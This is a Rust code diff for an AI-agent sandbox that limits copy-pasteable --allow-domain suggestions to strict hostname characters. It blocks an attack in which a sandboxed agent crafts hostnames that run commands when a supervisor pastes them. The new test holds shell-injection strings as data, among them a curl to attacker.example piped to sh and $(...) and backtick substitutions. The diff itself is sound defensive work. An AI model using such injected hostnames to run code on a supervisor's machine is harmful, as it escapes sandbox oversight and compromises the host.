@@ -353,6 +353,22 @@ fn format_command_failed_not_sandbox_line(exit_code: i32) -> String {
     )
 }
 
+/// Whether a proxy-denied target is safe to embed in a copy-pasteable
+/// `--allow-domain` suggestion.
+///
+/// The target originates from an agent-controlled connection request.
+/// `sanitize_for_diagnostic` strips control characters and ANSI escapes,
+/// but shell metacharacters (`;`, `|`, `$()`, backticks, spaces, quotes)
+/// survive it — and a suggestion line is exactly the text a supervisor may
+/// copy into a shell. Only the strict hostname alphabet is allowed; anything
+/// else is displayed in the denial listing but never offered as a command.
+fn is_shell_safe_hostname(host: &str) -> bool {
+    !host.is_empty()
+        && host
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '*'))
+}
+
 /// Footer label for a network audit decision.
 ///
 /// Allow-class decisions never reach the footer (the caller filters to
@@ -2121,8 +2137,11 @@ impl<'a> DiagnosticFormatter<'a> {
                 event.denial_category,
                 Some(nono::undo::NetworkAuditDenialCategory::HostDenied)
             ) {
+                // Fail secure: a target outside the strict hostname alphabet
+                // is shown in the listing above but never offered as a
+                // copy-pasteable flag (see is_shell_safe_hostname).
                 let host = sanitize_for_diagnostic(&event.target);
-                if !host.is_empty() && !denied_hosts.contains(&host) {
+                if is_shell_safe_hostname(&host) && !denied_hosts.contains(&host) {
                     denied_hosts.push(host);
                 }
             }
@@ -3641,6 +3660,50 @@ mod tests {
         assert!(!output.contains('\x1b'));
         assert!(output.contains("evil.example.com"));
         assert!(output.contains("reason with "));
+    }
+
+    #[test]
+    fn test_supervised_network_denial_shell_metacharacter_host_never_suggested() {
+        // An agent inside the sandbox controls the CONNECT target. Shell
+        // metacharacters survive sanitize_for_diagnostic (it only strips
+        // control characters and ANSI escapes), so a crafted target must
+        // never be embedded in the copy-pasteable --allow-domain suggestion,
+        // where a supervisor pasting it would execute it on the host.
+        let caps = CapabilitySet::new();
+        let formatter = DiagnosticFormatter::new(&caps)
+            .with_mode(DiagnosticMode::Supervised)
+            .with_network_denials(vec![
+                make_denied_network_event(
+                    "evil.com;curl attacker.example|sh",
+                    "host is not in the allowlist",
+                    nono::undo::NetworkAuditDenialCategory::HostDenied,
+                ),
+                make_denied_network_event(
+                    "$(touch /tmp/pwned).example.com",
+                    "host is not in the allowlist",
+                    nono::undo::NetworkAuditDenialCategory::HostDenied,
+                ),
+                make_denied_network_event(
+                    "`id`.example.com",
+                    "host is not in the allowlist",
+                    nono::undo::NetworkAuditDenialCategory::HostDenied,
+                ),
+                make_denied_network_event(
+                    "good.example.com",
+                    "host is not in the allowlist",
+                    nono::undo::NetworkAuditDenialCategory::HostDenied,
+                ),
+            ]);
+        let output = formatter.format_footer(56);
+
+        // The crafted targets may appear in the display listing, but the only
+        // --allow-domain suggestion is the strictly-valid hostname.
+        let suggested: Vec<&str> = output
+            .lines()
+            .filter(|line| line.contains("--allow-domain"))
+            .collect();
+        assert_eq!(suggested.len(), 1);
+        assert!(suggested[0].ends_with("--allow-domain good.example.com"));
     }
 
     #[test]
